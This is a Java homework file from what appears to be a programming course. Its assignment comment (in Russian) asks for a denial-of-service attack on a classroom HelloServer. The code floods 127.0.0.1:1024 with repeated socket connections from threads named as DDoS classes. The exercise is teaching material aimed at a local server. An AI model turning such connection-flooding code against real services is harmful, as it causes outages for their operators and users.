package pavelkorzhenko;

import java.io.*;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.concurrent.BrokenBarrierException;
import java.util.concurrent.CyclicBarrier;

/**
 * @author Pavel Korzhenko
 * @version 0.1 2017/11/11
 * @task 06
 * @mark
 *
 * 1. Разобраться с кодом, показанным на занятии. Модифицировать код SimpleClient так, чтобы клиент мог
 * читать сообщения от сервера.
 * @see SimpleClient
 *
 * 2. *** Написать приложение, атакующее HelloServer так, чтобы вызвать отказ в обслуживании.
 * @see this
 */

public class GbJava2Task06 {
    public static  final CyclicBarrier GATE = new CyclicBarrier(2, new AnotherDDos());

    public static void main(String[] args) {
        int numberThread = 2;
        Thread[] th = new Thread[numberThread];
        for (int i = 0; i < numberThread; i++) {
            th[i] = new Thread(new HelloDddos());
            th[i].start();
            try {
                th[i].join();
            } catch (InterruptedException e) {
                e.printStackTrace();
                return;
            }
        }
    }

    public static class AnotherDDos implements Runnable {
        BufferedReader reader;
        @Override
        public void run() {
            System.out.println("\n===== start YET run..\n");
            for (int i = 1; i < 1000; i++){
                try {
                    Socket socket = new Socket("127.0.0.1", 1024);
                    //Thread.currentThread().sleep(100);
                    reader = new BufferedReader(
                            new InputStreamReader(socket.getInputStream()));
                    System.out.println(reader.readLine());
                    reader.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
    }

    /**
     * DDos Attack to HelloServer
     */
    public static class HelloDddos implements Runnable {
        BufferedReader reader;

        public HelloDddos() {
        }

        @Override
        public void run() {
            System.out.println("\n---------start run..\n");
            for (int i = 1; i < 1000; i++){
                try {
                    Socket socket = new Socket("127.0.0.1", 1024);
                    Thread.currentThread().sleep(100);
                    GATE.await();
                    reader = new BufferedReader(
                            new InputStreamReader(socket.getInputStream()));
                    System.out.println(reader.readLine());
                    reader.close();
                } catch (BrokenBarrierException | InterruptedException | IOException e) {
                    e.printStackTrace();
                }
            }
        }
    }
}

